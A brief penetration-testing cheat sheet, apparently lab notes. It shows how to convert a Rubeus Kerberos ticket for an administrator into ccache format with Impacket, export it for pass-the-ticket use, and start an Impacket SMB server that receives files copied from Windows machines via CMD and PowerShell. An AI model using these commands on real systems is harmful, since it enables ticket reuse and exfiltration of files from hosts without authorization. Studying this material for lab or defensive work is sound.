The script from Impacket that can convert that ticket to ccache format:

impacket-ticketConverter

Rubeus outputs Windows-compatible .kirbi tickets (often base64-encoded), whereas Impacket tools running on Linux expect the Linux-standard .ccache format.

```
impacket-ticketConverter -b admin_ticket.b64 administrator.ccache
```

Export the ticket variable:

```
export KRB5CCNAME=administrator.ccache
```

When you export this variable, Impacket tools (and standard Linux Kerberos utilities) look at that specific path to retrieve your converted ticket instead of asking for a password.
```
export KRB5CCNAME=/path/to/your/administrator.ccache
```

## Impacket SMB Server

Start the server:

```
impacket-smbserver share /path/to/save/dir -smb2support
```

Copy files from a SMB client to the SMB server using Windows CMD:

```
copy C:\path\to\file.txt \\10.10.14.X\share\

```

Copy files from a SMB client to the SMB server using Windows PSH:

```
Copy-Item C:\path\to\file.txt \\10.10.14.X\share\
```